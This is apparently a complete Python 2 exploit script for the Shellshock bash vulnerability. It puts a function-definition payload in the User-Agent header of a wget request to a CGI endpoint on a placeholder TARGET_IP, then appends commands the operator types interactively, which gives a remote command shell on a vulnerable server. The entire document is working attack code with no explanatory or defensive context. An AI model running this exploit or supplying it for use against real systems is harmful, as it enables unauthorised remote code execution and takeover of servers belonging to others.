#!/usr/bin/python

import os

while True:
	cmd = raw_input("~#")
	os.system("wget -qO- --header \"User-Agent: () { ignored; };" +\
		  "echo Content-Type: text/plain ; echo ; echo ;" +\
		   str(cmd) + ";\" --no-check-certificate https://TARGET_IP/cgi-bin/test-cgi")

